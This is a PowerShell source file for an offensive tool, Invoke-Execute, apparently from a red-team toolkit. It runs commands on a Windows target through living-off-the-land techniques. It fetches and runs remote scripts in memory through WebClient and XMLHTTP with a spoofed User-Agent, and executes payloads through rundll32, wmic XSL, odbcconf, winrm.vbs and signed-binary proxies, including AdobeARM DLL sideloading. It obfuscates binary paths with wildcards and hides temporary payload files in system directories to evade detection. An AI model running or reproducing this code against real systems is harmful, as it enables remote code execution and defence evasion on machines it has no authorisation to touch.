function Invoke-Execute {
<#
                                          
.SYNOPSIS
	Execute commands on a target system using a number of different "living-off-the-land" techniques.

.PARAMETER Help
	Shows detailed help for each function.

.PARAMETER List
	Shows summary list of available functions.
	
.PARAMETER DownloadString
	Executes a remote powershell script in memory using Net.WebClient DownloadString Method.
	
.PARAMETER XmlHTTP
	Executes a remote powershell script in memory using Msxml2.XMLHTTP COM Object.
	
.PARAMETER Rundll
	Executes a local DLL/EXE (or command) using rundll32 with a number of different methods.

.PARAMETER WmicExec
	Executes a local command via "wmic process call create".

.PARAMETER WmicXSL
	Utilizes wmic process get brief to execute a built-in XSL file containing a JScript ActiveXObject command.

.PARAMETER OdbcExec
	Uses odbcconf.exe to execute a local DLL or DLL at a UNC path.

.PARAMETER WinRmWmi
	Executes a command from a built-in XML file via winrm.vbs.

.PARAMETER SignedProxyDll
	Executes a DLL via an existing signed binary.
		
		Available SignedProxyDll Methods:
		  
		  [1] AdobeARM.exe

.PARAMETER SignedProxyExe
	Executes an EXE via an existing signed binary.
	
		Available SignedProxyExe Methods:
		  
		  [1] pcalua.exe
		  [2] SynTPEnh.exe
	
.EXAMPLE
	Invoke-Execute -RunDll -Method 1 -File C:\temp\File.dll         
	Invoke-Execute -RunDll -Method 5 -File 'cmd.exe /c net user....'

       Available RunDLL Methods:                                              

        [1] shell32.dll,Control_RunDLL   (DLL or CPL)
        [2] shell32.dll,Control_RunDLLA  (DLL or CPL)
        [3] IEAdvpack.dll,RegisterOCX    (DLL or EXE or COMMAND)
        [4] zipfldr.dll,RouteTheCall     (EXE)
        [5] advpack.dll,RegisterOCX      (DLL or EXE or COMMAND)
        [6] pcwutl.dll,LaunchApplication (EXE)

.EXAMPLE
	Invoke-Execute -OdbcExec -Dll \\server\share\File.dll
	
.EXAMPLE
	Invoke-Execute -WinRmWmi -Command "cmd.exe /c net user...."
	
.EXAMPLE 
	Invoke-Execute -SignedProxyExe -Method 1 -Exe C:\temp\file.exe
	
.EXAMPLE
	Invoke-Execute -XmlHTTP -PsUrl http://192.168.1.1/script.ps1
	
.NOTES
	Author: Fabrizio Siciliano (@0rbz_)

#>

[CmdletBinding()]
param (
	[Parameter(Position=1)]
	[Switch]$Help,
	[Switch]$List,
	
	[Parameter(Mandatory = $False)]
	[Switch]$DownloadString,
	[String]$PsUrl,
	
	[Parameter(Mandatory = $False)]
	[Switch]$XmlHTTP,
	[String]$PsUrl2=[String]$PsUrl,
	
	[Parameter(Mandatory = $False)]
	[Switch]$Rundll,
	[String]$Method,
	[string]$File,
	
	[Parameter(Mandatory = $False)]
	[Switch]$WmicExec,
	[string]$Command,
	
	[Parameter(Mandatory = $False)]
	[Switch]$WmicXSL,
	[string]$command2=[string]$command,
	
	[Parameter(Mandatory = $False)]
	[Switch]$OdbcExec,
	[string]$Dll,
	
	[Parameter(Mandatory = $False)]
	[Switch]$WinRmWmi,
	[string]$Command3=[string]$Command,
	
	[Parameter(Mandatory = $False)]
	[Switch]$SignedProxyDll,
	[String]$Method2=[String]$Method,
	[String]$Dll2=[string]$Dll,
	
	[Parameter(Mandatory = $False)]
	[Switch]$SignedProxyExe,
	[String]$Method3=[String]$Method,
	[String]$Exe
	
)
$DataDirs = @(
	("C:\ProgramData\Intel"),
	("C:\ProgramData\Microsoft\Crypto\SystemKeys"),
	("C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"),
	("C:\ProgramData\Microsoft\Crypto\SystemKeys"),
	("C:\ProgramData\Microsoft\Diagnosis"),
	("C:\ProgramData\Microsoft\Diagnosis\FeedbackHub"),
	("C:\ProgramData\Microsoft\Diagnosis\Scripts"),
	("C:\ProgramData\Microsoft\Network\Downloader"),
	("C:\ProgramData\Microsoft\Search\Data"),
	("C:\ProgramData\Microsoft\Search\Data\Applications"),
	("C:\ProgramData\Microsoft\Search\Data\Temp"),
	("C:\ProgramData\Microsoft\Windows\WER\ReportArchive"),
	("C:\ProgramData\Microsoft\Windows\WER\ReportQueue"),
	("C:\ProgramData\Microsoft\Windows\WER\Temp"),
	("C:\ProgramData\WindowsHolographicDevices"),
	("C:\Users\Public\Libraries"),
	("C:\Users\Public\AccountPictures"),
	("C:\Users\Public\Documents"),
	("C:\Users\Public\Downloads"),
	("C:\Users\Public\Music"),
	("C:\Users\Public\Pictures"),
	("C:\Users\Public\Videos"),
	("C:\Users\Public\Roaming"),
	("C:\Windows\debug\WIA"),
	("C:\Windows\ServiceProfiles\LocalService"),
	("C:\Windows\ServiceProfiles\LocalService\AppData"),
	("C:\Windows\ServiceProfiles\LocalService\AppData\Local"),
	("C:\Windows\ServiceProfiles\LocalService\AppData\LocalLow"),
	("C:\Windows\Temp"),
	("C:\windows\system32\config"),
	("C:\Windows\System32\LogFiles\WMI"),
	("C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys")
)

$NewArray = foreach ($datadir in $datadirs) {
	if (Test-Path $datadir) {
	@($datadir)
	}
}
$datadir = ($newarray[(get-random -Maximum ([array]$newarray).count)])

$Rs1 = (-join ((65..90) + (97..122) | Get-Random -Count 13 | foreach {[char]$_}))
$Rs2 = (-join ((65..90) + (97..122) | Get-Random -Count 11 | foreach {[char]$_}))
$Rs3 = (-join ((65..90) + (97..122) | Get-Random -Count 9 | foreach {[char]$_}))
	
	if ($Help) {
		
		Write @"
 
 ### Invoke-Execute Help ###
 ---------------------------
 Available Invoke-Execute Commands:
 ----------------------------------
 |----------------------------------------------------------------------------|
 | -DownloadString [-PsUrl] url                                               |
 |----------------------------------------------------------------------------|

   [*] Description: Executes a remote powershell script in memory
       using Net.WebClient DownloadString Method.

   [*] Usage: Invoke-Execute -DownloadString -PsUrl http://server/script.ps1 
   
   [*] Mitre ATT&CK Ref: T1086 (PowerShell)
   
 |----------------------------------------------------------------------------|
 | -XmlHTTP [-PsUrl] url                                                      |
 |----------------------------------------------------------------------------|

   [*] Description: Executes a remote powershell script in memory using 
       Msxml2.XMLHTTP COM Object.

   [*] Usage: Invoke-Execute -XmlHTTP -PsUrl http://server/script.ps1 
   
   [*] Mitre ATT&CK Ref: T1086 (PowerShell)
	   	   
 |----------------------------------------------------------------------------|
 | -RunDLL [-Method] num [-File] path_to_dll                                  |
 |----------------------------------------------------------------------------|

   [*] Description: Executes a local DLL/EXE (or command) using               
       rundll32 with a number of different methods.                         

   [*] Usage: Invoke-Execute -RunDll -Method 1 -File C:\temp\File.dll         
   [*] Usage: Invoke-Execute -RunDll -Method 5 -File 'cmd.exe /c net user....'

       Available RunDLL Methods:                                              

        [1] shell32.dll,Control_RunDLL   (DLL or CPL)
        [2] shell32.dll,Control_RunDLLA  (DLL or CPL)
        [3] IEAdvpack.dll,RegisterOCX    (DLL or EXE or COMMAND)
        [4] zipfldr.dll,RouteTheCall     (EXE)
        [5] advpack.dll,RegisterOCX      (DLL or EXE or COMMAND)
        [6] pcwutl.dll,LaunchApplication (EXE)

   [*] Mitre ATT&CK Ref: T1085 (Rundll32)    	   
 	
 |----------------------------------------------------------------------------|
 | -WmicExec [-Command] "cmd.exe /c net user..."                              |
 |----------------------------------------------------------------------------|

   [*] Description: Executes a local command via wmic process call            
       create.

   [*] Usage: Invoke-Execute -WmicExec -Command "cmd.exe /c net user..."
   
   [*] Mitre ATT&CK Ref: T1047 (Windows Management Instrumentation)

 |----------------------------------------------------------------------------|
 | -WmicXsl [-Command] "cmd.exe /c net user..."                               |
 |----------------------------------------------------------------------------|

   [*] Description: Utilizes wmic process get brief to execute a built-in XSL 
      file containing a JScript ActiveXObject command.

   [*] Usage: Invoke-Execute -WmicXsl -Command "cmd.exe /c net user..."
   
   [*] Mitre ATT&CK Ref: T1220 (XSL Script Processing)

 |----------------------------------------------------------------------------|
 | -OdbcExec [-Dll] path_to_dll                                               |
 |----------------------------------------------------------------------------|

   [*] Description: Uses odbcconf.exe to execute a local DLL or DLL           
       at a UNC path.

   [*] Usage: Invoke-Execute -OdbcExec -Dll \\server\share\File.dll
   [*] Usage: Invoke-Execute -OdbcExec -Dll C:\temp\File.dll
   
   [*] Mitre ATT&CK Ref: T1085 (Rundll32)

 |----------------------------------------------------------------------------|
 | -WinRmWmi [-Command] "cmd /c net user ..."                                 |
 |----------------------------------------------------------------------------|

   [*] Description: Executes a command from a built-in XML file via winrm.vbs.

   [*] Usage: Invoke-Execute -WinRmWmi -Command cmd.exe
   [*] Usage: Invoke-Execute -WinRmWmi -Command "cmd.exe /c net user...."
   
   [*] Mitre ATT&CK Ref: T1028 (Windows Remote Management)
 
 |----------------------------------------------------------------------------|
 | -SignedProxyDll [-Method] num [-Dll] file.dll                              |
 |----------------------------------------------------------------------------|

   [*] Description: Executes a DLL via an existing signed binary.

   [*] Usage: Invoke-Execute -SignedProxyDll -Method 1 -Dll C:\temp\file.dll

       Available SignedProxyDll Methods

        [1] AdobeARM.exe
	   
   [*] Mitre ATT&CK Ref: T1218 (Signed Binary Proxy Execution)

 |----------------------------------------------------------------------------|
 | -SignedProxyExe [-Method] num [-Exe] file.exe                              |
 |----------------------------------------------------------------------------|

   [*] Description: Executes an EXE via an existing signed binary.

   [*] Usage: Invoke-Execute -SignedProxyExe -Method 1 -Exe C:\temp\file.exe

       Available SignedProxyExe Methods:

        [1] pcalua.exe
        [2] SynTPEnh.exe
		
   [*] Mitre ATT&CK Ref: T1218 (Signed Binary Proxy Execution)
		
 \-----------------------------------------------------------------------------/
 
"@
	}
	
	elseif ($List -eq $True) {
		Write @"  

 Invoke-Execute Brief Command Usage:
 -----------------------------------
 Invoke-Execute -DownloadString -PsUrl http://server/script.ps1
 Invoke-Execute -XmlHTTP -PsUrl http://server/script.ps1
 Invoke-Execute -RunDll -Method 1,2,3,4,5,6 -File 'cmd.exe /c net user....'
 Invoke-Execute -WmicExec -Command "cmd.exe /c net user..."
 Invoke-Execute -WmicXsl -Command "cmd.exe /c net user..."
 Invoke-Execute -OdbcExec -Dll \\server\share\File.dll
 Invoke-Execute -WinRmWmi -Command "cmd.exe /c net user...."
 Invoke-Execute -SignedProxyDll -Method 1 -Dll C:\temp\file.dll
 Invoke-Execute -SignedProxyExe -Method 1,2 -Exe C:\temp\file.exe

"@
	}

	elseif ($DownloadString -and $PsUrl) {
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		$h = "`n### Invoke-Execute(DownloadString) ###`n"
		Try {
		
			$dl = New-Object System.Net.WebClient
			$dl.headers.add("User-Agent", "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5")
			Invoke-Expression $dl.DownloadString($PsUrl)
			$h
			Write " [+] Executed the following powershell script in memory: $PsUrl"
			$h
		}
		Catch {
			$h
			Write "`n [!] Unknown Error.`n"
			$h
		}
	}
	elseif ($XmlHTTP -and $PsUrl) {
	# https://gist.github.com/HarmJ0y/bb48307ffa663256e239
		$h = "`n### Invoke-Execute(XmlHTTP) ###`n"
		Try {
			$Dl = (New-Object -ComObject Msxml2.XMLHTTP)
			$Dl.open('GET',"$PsUrl",$false)
			$Dl.send()
			Invoke-Expression $Dl.responseText
			$h 
			Write " [+] Executed the following powershell script in memory: $PsUrl"
			$h
		}
		Catch {
			$h
			Write "`n [!] Unknown Error.`n"
			$h
		}
	}
	elseif ($RunDll -and $Method -eq 1 -and $File) {
	# https://www.thewindowsclub.com/rundll32-shortcut-commands-windows
	# https://twitter.com/mattifestation/status/776574940128485376
		$h = "`n### Invoke-Execute(rundll) ###`n"
		(C:\??*?\*3?\?un?l*3?.?x? C:\$rs2\..\$rs1\..\..\..\windows\system32\shell32.dll,Control_RunDLL $File)
		$h
		Write " [+] Executed: rundll32.exe shell32.dll,Control_RunDLL $File"
		$h
	}
	elseif ($Rundll -and $Method -eq 2 -and $File) {
	# https://www.thewindowsclub.com/rundll32-shortcut-commands-windows
	# https://twitter.com/Hexacorn/status/885258886428725250
		$h = "`n### Invoke-Execute(rundll) ###`n"
		(C:\??*?\*3?\?un?l*3?.?x? C:\$rs2\..\..\..\windows\system32\shell32.dll,Control_RunDLLA $File)
		$h
		Write " [+] Executed: rundll32.exe shell32.dll,Control_RunDLLA $File"
		$h
	}
	elseif ($Rundll -and $Method -eq 3 -and $File) {
	# https://twitter.com/0rbz_/status/974472392012689408
		$h = "`n### Invoke-Execute(rundll) ###`n"
		(C:\??*?\*3?\?un?l*3?.?x? C:\$rs2\..\..\..\windows\system32\IEAdvpack.dll,RegisterOCX $File)
		$h
		Write " [+] Executed: rundll32.exe IEAdvpack.dll,RegisterOCX $File"
		$h
	}
	elseif ($Rundll -and $Method -eq 4 -and $File) {
	# https://twitter.com/Moriarty_Meng/status/977848311603380224
		$h = "`n### Invoke-Execute(rundll) ###`n"
		(C:\??*?\*3?\?un?l*3?.?x? C:\$rs2\..\..\..\windows\system32\zipfldr.dll,RouteTheCall $File)
		$h
		Write " [+] Executed: rundll32.exe zipfldr.dll,RouteTheCall $File"
		$h
	}
	elseif ($Rundll -and $Method -eq 5 -and $File) {
	# https://twitter.com/bohops/status/977891963763675141
		$h = "`n### Invoke-Execute(rundll) ###`n"
		(C:\??*?\*3?\?un?l*3?.?x? C:\$rs2\..\..\..\windows\system32\advpack.dll,RegisterOCX $File)
		$h
		Write " [+] Executed: rundll32.exe advpack.dll,RegisterOCX $File"
		$h
	}
	elseif ($Rundll -and $Method -eq 6 -and $File) {
	# https://twitter.com/harr0ey/status/989617817849876488
	# https://windows10dll.nirsoft.net/pcwutl_dll.html
		$h = "`n### Invoke-Execute(rundll) ###`n"
		(C:\??*?\*3?\?un?l*3?.?x? C:\$rs2\..\..\..\windows\system32\pcwutl.dll,LaunchApplication $File)
		$h
		Write " [+] Executed: rundll32.exe pcwutl.dll,LaunchApplication $File"
		$h	
	}	

	elseif ($WmicExec -and $Command) {
		Try {
			$h = "`n### Invoke-Execute(WmicExec) ###`n"
			$h
			(C:\??*?\*3?\?b?m\?m*c.?x? process call create $command)
			Write " `n [+] Command executed: $command"
			$h
		}
		Catch {
		
			Write " [!] Error."
			$h
		}
	}
	
	elseif ($WmicXSL -and $Command) {
	# https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html

		Try {
			$h = "`n### Invoke-Execute(WmicXSL) ###`n"
			$XslFileContent = @"
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="$rs2"
version="1.0">
<output method="text"/>
		<ms:script implements-prefix="user" language="JScript">
		<![CDATA[
		var $rs1 = new ActiveXObject("WScript.Shell").Run("$Command");
		]]> </ms:script>
</stylesheet>
"@
			$h
			$XslFile = "$DataDir\$rs3.xsl"
			$WmicArgs = "/format:"
			(Set-Content -Path $XslFile -Value $XslFileContent)
			(C:\??*?\*3?\?b?m\?m*c.?x? process get brief $WmicArgs"`"$XslFile"`")
			Remove-Item $XslFile
			Write " [+] Command Executed: $command"
			$h
		}
		Catch {
			Write " [!] Unknown Error. Check that WMIC is present on the target."
		}
	}
	
	elseif ($OdbcExec -and $Dll) {
		$h ="`n### Invoke-Execute(OdbcExec) ###`n"
		if ($(Test-Path "C:\??*?\*3?\?*co?f.?x?")) {
			$h
			(C:\??*?\*3?\?*co?f.?x? /a `{REGSVR $Dll`})
			Write " Executed Command: odbcconf.exe /a {REGSVR $Dll}"
			$h
		}
		else {
			$h
			Write "$env:windir\odbcconf.exe not found. Can't execute this module."
			$h
			return
		}
	}
	
	elseif ($WinRmWmi -and $Command) {
	# https://twitter.com/harr0ey/status/1062468588299345920
	# https://lolbas-project.github.io/lolbas/Scripts/Winrm/
		$h = "`n### Invoke-Execute(WinRmWmi) ###`n"
		
		if ($(Get-Service -Name winrm | Select-Object -ExpandProperty status) -eq "Stopped") {
			$h
			Write "WinRM Service isn't running. If you're admin, try starting the WinRM Service with the 'winrm quickconfig' command."
			$h
			return
		}
		if ($(Get-Service -Name winrm | Select-Object -ExpandProperty status) -eq "Running" -and $(Test-Path C:\??*?\*3?\w?nr?.v?s)) {

			$XmlFileContent = @"
<?xml version="1.0" encoding="UTF-8"?><!--JÕ›E$†›E$†›E$†’=·†E$†›E%†³E$†è'%‡’E$†è'H‰D$HE3ÀHT$PH‹L$Hÿ-->
<p:Create_INPUT xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Process">
    <p:CommandLine><!--JÕ›E$†›E$†›E$†’=·†E$†›E%†³E$†è'%‡’E$†è'H‰D$HE3ÀHT$PH‹L$Hÿ-->$Command<!-- JÕ›E$†›E$†›E$†’=·†E$†›E%†³E$†è'%‡’E$†è'H‰D$HE3ÀHT$PH‹L$Hÿ--></p:CommandLine>
<!--JÕ›E$†›E$†›E$†’=·†E$†›E%†³E$†è'%‡’E$†è'H‰D$HE3ÀHT$PH‹L$Hÿ--><p:CurrentDirectory>C:\</p:CurrentDirectory>
</p:Create_INPUT>
"@
			$h
			$XmlFile = "$DataDir\$rs1"
			(Set-Content -Path $XmlFile -Value $XmlFileContent)
		
			(C:\??*?\*3?\c?c*i?t.?x? C:\$rs2\..\..\..\windows\system32\winrm.vbs i c wmicimv2/Win32_Process -SKipCAcheCk -SkIpCNchEck -file:$XmlFile)
			
			Remove-Item $XmlFile
			Write " Command Executed: $command"
			$h
		}
		else {
			$h
			Write "Couldn't find $env:windir\system32\winrm.vbs. Execution failed."
			$h
		}
	}
	
	elseif ($SignedProxyDll -and $Method -eq 1 -and $Dll) {
		$h = "`n### Invoke-Execute(SignedProxyDll) ###`n"

		$AdobeArmExe = (Get-Item 'C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe').FullName
		
		if ($(Test-Path $AdobeArmExe)) {
			
			(Copy-Item $AdobeArmExe -Destination $env:appdata\AdobeARM.exe)
			(Copy-Item $Dll -Destination $env:appdata\AdobeARMENU.dll)
			
			$command = "$env:appdata\AdobeARM.exe"
			Invoke-Expression $command
			$h 
			Write " [+] Executed $Dll using $AdobeArmExe."
			$h 
		}
		else {
			$h 
			Write " [-] Can't find the AdobeARM.exe binary."
			$h 
			return
		}
	}
	
	elseif ($SignedProxyExe -and $Method -eq 1 -and $Exe) {
		$h = "`n### Invoke-Execute(SignedProxyExe) ###`n"
		
		if (Test-Path C:\??*?\*3?\p?al*?.?x?) {
		# https://twitter.com/0rbz_/status/912530504871759872
		# https://twitter.com/kylehanslovan/status/912659279806640128
			
			(C:\??*?\*3?\p?al*?.?x? -a $Exe)
			$h 
			Write " [+] Executed Command: pcalua.exe -a $Exe."
			$h 
		}
		else {
			$h 
			Write " [+] Couldn't find pcalua.exe. Quitting."
			$h 
			return
		}
	}
	elseif ($SignedProxyExe -and $Method -eq 2 -and $Exe) {
		# https://twitter.com/egre55/status/1052907871749459968
		$h = "`n### Invoke-Execute(SignedProxyExe) ###`n"
		
		$SynTPEnhP = (Get-Item 'C:\Program Files\Synaptics\SynTP\SynTPEnh.exe')
		$SynTPEnhS = (Get-Item 'C:\windows\system32\SynTPEnh.exe')
		
		if ($(Test-Path -Path 'C:\Program Files\Synaptics\SynTP\SynTPEnh.exe')) {
		
			(Invoke-Expression $SynTPEnhP /SHELLEXEC $Exe)
			
			$h 
			Write " [+] Executed Command: $SynTPEnhP /SHELLEXEC $Exe."
			$h 
		}
		elseif ($(Test-Path -Path 'C:\windows\system32\SynTPEnh.exe')) {
			
			(Invoke-Expression $SynTPEnhS /SHELLEXEC $Exe)
			
			$h 
			Write " [+] Executed Command: $SynTPEnhS /SHELLEXEC $Exe."
			$h 
		}
		else {
			$h 
			Write " [+] Couldn't find SynTPEnh.exe. Quitting."
			$h 
			return
		}
	}
}